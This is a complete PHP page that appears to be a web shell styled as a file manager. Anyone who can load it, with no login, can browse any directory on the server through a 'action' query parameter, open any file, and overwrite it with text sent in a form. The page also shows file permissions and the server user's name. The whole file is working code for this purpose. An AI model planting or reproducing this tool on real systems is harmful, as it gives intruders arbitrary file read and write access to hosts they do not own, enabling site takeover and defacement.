<?php
    date_default_timezone_set('Asia/Jakarta');
    $ignore_file_list = array( ".htaccess", "Thumbs.db", ".DS_Store", "index.php" );
    $ignore_ext_list = array( );
    $sort_by = "name_asc";
    $icon_url = "https://image.flaticon.com/icons/svg/833/833524.svg";
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title><?php echo get_current_user(); ?></title>
    <script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.0/jquery.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@500&display=swap');
        *, *:before, *:after {
            -moz-box-sizing: border-box; 
            -webkit-box-sizing: 
            border-box; box-sizing: 
            border-box; 
        }
        body { 
            font-family: 'Ubuntu', sans-serif;
            font-weight: 400; 
            font-size: 14px; 
            line-height: 18px; 
            padding: 0; 
            margin: 0; 
            background: #f5f5f5; 
        }
        .wrap { 
            max-width: 600px; 
            margin: 20px auto; 
            background: white; 
            padding: 40px; 
            box-shadow: 0 0 2px #ccc; 
        }
        textarea {
            width:100%;
            height:350px;
            background: white;
            outline:none;
        }
        @media only screen and (max-width: 700px) { 
            .wrap { 
                padding: 15px; 
                } 
            }
        a { 
            color: #399ae5; 
            text-decoration: none; 
        } 
        a:hover { 
            color: #206ba4; 
            text-decoration: none; 
        }
        .note { 
            padding:  0 5px 25px 0; 
            font-size:80%; 
            color: #666; 
            line-height: 18px; 
        }
        .block { 
            clear: both;  
            min-height: 50px; 
            border-top: solid 1px #ECE9E9; 
        }
        .block:first-child { 
            border: none; 
        }
        .block .img { 
            width: 50px; 
            height: 50px; 
            display: block; 
            float: left; 
            margin-right: 10px; 
        }
        .block .date { 
            margin-top: 4px; 
            font-size: 70%; 
            color: #666; 
        }
        .block a { 
            display: block; 
            padding: 10px 15px; 
            transition: all 0.35s; 
        }
        .block a:hover { 
            text-decoration: none; 
            background: #efefef; 
        }
        .jpg, .jpeg, .gif, .png { 
            background-position: -50px 0 !important; 
        }
        .pdf { 
            background-position: -100px 0 !important; 
        }
        .txt, .rtf { 
            background-position: -150px 0 !important; 
        }
        .xls, .xlsx { 
            background-position: -200px 0 !important; 
        }
        .ppt, .pptx { 
            background-position: -250px 0 !important; 
        }
        .doc, .docx { 
            background-position: -300px 0 !important; 
        }
        .zip, .rar, .tar, .gzip { 
            background-position: -350px 0 !important; 
        }
        .swf { 
            background-position: -400px 0 !important; 
        }
        .fla { 
            background-position: -450px 0 !important; 
        }
        .mp3 { 
            background-position: -500px 0 !important; 
        }
        .wav { 
            background-position: -550px 0 !important; 
        }
        .mp4 { 
            background-position: -600px 0 !important; 
        }
        .mov, .aiff, .m2v, .avi, .pict, .qif { 
            background-position: -650px 0 !important; 
        }
        .wmv, .avi, .mpg { 
            background-position: -700px 0 !important; 
        }
        .flv, .f2v { 
            background-position: -750px 0 !important; 
        }
        .psd { 
            background-position: -800px 0 !important; 
        }
        .ai { 
            background-position: -850px 0 !important; 
        }
        .html, .xhtml, .dhtml, .php, .asp, .css, .js, .inc { 
            background-position: -900px 0 !important; 
        }
        .dir { 
            background-position: -950px 0 !important; 
        }
        .sub { 
            margin-left: 20px; 
            border-left: solid 1px #ECE9E9; 
            display: none; 
        }

    </style>
</head>
<body>
<div class="wrap">
<?php
if (isset($_GET['action'])) {
    if (is_dir($_GET['action'])) {
        chdir($_GET['action']);
    } else {
        if (is_file($_GET['action'])) {
            edit($_GET['action'], "edit");
        }
    }
}
function cleanTitle($title) {
    return ucwords( str_replace( array("-", "_"), " ", $title) );
}

function getFileExt($filename) {
    return substr( strrchr( $filename,'.' ),1 );
}

function format_size($file) {
    $bytes = filesize($file);
    if ($bytes < 1024) return $bytes.'b';
    elseif ($bytes < 1048576) return round($bytes / 1024, 2).'kb';
    elseif ($bytes < 1073741824) return round($bytes / 1048576, 2).'mb';
    elseif ($bytes < 1099511627776) return round($bytes / 1073741824, 2).'gb';
    else return round($bytes / 1099511627776, 2).'tb';
}

function ext($file) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    switch ($ext) {
        case is_dir($ext):
            print("https://image.flaticon.com/icons/svg/716/716784.svg");
            break;
        case 'php':
            print("https://image.flaticon.com/icons/png/128/337/337947.png");
            break;
        
        default:
            print("https://image.flaticon.com/icons/svg/833/833524.svg");
            break;
    }
}

function perms($file){
    $perms = @fileperms($file);

if (($perms & 0xC000) == 0xC000) { $info = 's'; } 
elseif (($perms & 0xA000) == 0xA000) { $info = 'l'; } 
elseif (($perms & 0x8000) == 0x8000) { $info = '-'; } 
elseif (($perms & 0x6000) == 0x6000) { $info = 'b'; } 
elseif (($perms & 0x4000) == 0x4000) { $info = 'd'; } 
elseif (($perms & 0x2000) == 0x2000) { $info = 'c'; } 
elseif (($perms & 0x1000) == 0x1000) { $info = 'p'; } 
else { $info = 'u'; }

$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ? 
         (($perms & 0x0800) ? 's' : 'x' ) :
         (($perms & 0x0800) ? 'S' : '-'));
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
         (($perms & 0x0400) ? 's' : 'x' ) :
         (($perms & 0x0400) ? 'S' : '-'));
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
         (($perms & 0x0200) ? 't' : 'x' ) :
         (($perms & 0x0200) ? 'T' : '-'));
return $info;
}

function permission($file, $perms) {
    switch ($file) {
        case is_writable($file):
            return "<span style='color:green;'>".$perms."</span>";
            break;
        
        case is_readable($file):
            return "<span style='color:red;'>".$perms."</span>";
            break;
    }
}

function refresh($url, $file){
    ?> <script type="text/javascript">window.location='?<?=$url?>=<?=getcwd().DIRECTORY_SEPARATOR.$file?>'</script> <?php
}

function save($file, $text) {
    $handle = fopen($file, "w");
    fwrite($handle, $text);
    fclose($handle);
}

function size($file) {
    if (is_dir($file)) {
        $filename = "";
    } elseif (is_file($file)) {
        $filename = "Size : ".format_size($file);
    } return $filename;
}

function getUrl($file) {
    if (is_writable($file)) {
        print "?action=".getcwd().DIRECTORY_SEPARATOR.$file."";
    } else {
        die("Not writable");
    }
}

function edit($file, $action = false) {
    switch ($action) {
        case 'edit':
            ?>
            <div class="block">
                <center><h1>EDIT</h1></center>
                Filename : <?= permission($file, basename($file))  ?> <br><br>
                <form method="post">
                    <textarea name="text"><?= htmlspecialchars(file_get_contents($file)) ?></textarea>
                    <input style="width: 100%;" type="submit" name="submit">
                </form>
            </div>
            <?php
            if (isset($_POST['submit'])) {
                if (save($file, $_POST['text'])) {
                    print("failed");
                } else {
                    refresh("action", $file);
                    print("success");
                }
            }
            exit();
            break;
    }
    
}

function display_block( $files ) {
    global $ignore_file_list, $ignore_ext_list;
    
    $file = getcwd().DIRECTORY_SEPARATOR.$files;
    $file_ext = getFileExt($file);
    if( !$file_ext AND is_dir($file)) {
        $file_ext = "dir"; 
    } if(in_array($file, $ignore_file_list)) {
        return;
    } if(in_array($file_ext, $ignore_ext_list)) {
        return;
    }

    ?>
    <div class=block>
    <a href="<?= getUrl(basename($file)) ?>" class="<?= $file_ext ?>">
        <div class="img"><img width="50px" height="50px" src="<?= ext($file) ?>"></div>
        <div class="name">
            <div class="file"><?= basename($file) ?>
                <div class="date">
                    <table>
                        <tr>
                            <td><?= size($file) ?></td>
                            <td><?= permission($file, perms($file)) ?></td>
                            <td><?= date("m.y.d - h:ia", filemtime($file)) ?></td>
                        </tr>
                    </table>
                </div>
            </div>
      </div>
      </a>
    </div>
    <?php
}

function build_blocks( $items, $folder ) {
    global $ignore_file_list, $ignore_ext_list, $sort_by;
    $objects = array();
    $objects['directories'] = array();
    $objects['files'] = array();

    foreach($items as $c => $item) {
        if($item == ".") continue;
        if(in_array($item, $ignore_file_list)) {
            continue;
        }

        if( $folder ) {
            $item = "$folder/$item";
        }
        $file_ext = getFileExt($item);
        if(in_array($file_ext, $ignore_ext_list)) {
            continue;
        } if( is_dir($item) ) {
            $objects['directories'][] = $item;
            continue;
        }
        $file_time = date("U", @filemtime($item));
        $objects['files'][$file_time . "-" . $item] = $item;
    }

    foreach($objects['directories'] as $file) {
        display_block( $file );
    }
    foreach($objects['files'] as $t => $file) {
        $fileExt = getFileExt($file);
        if(in_array($file, $ignore_file_list)) {
            continue;
        } if(in_array($fileExt, $ignore_ext_list)) { 
            continue; 
        } display_block( $file );
    }
}

$items = scandir( getcwd() );
build_blocks( $items, false );
?>
</div>
</body>
</html>
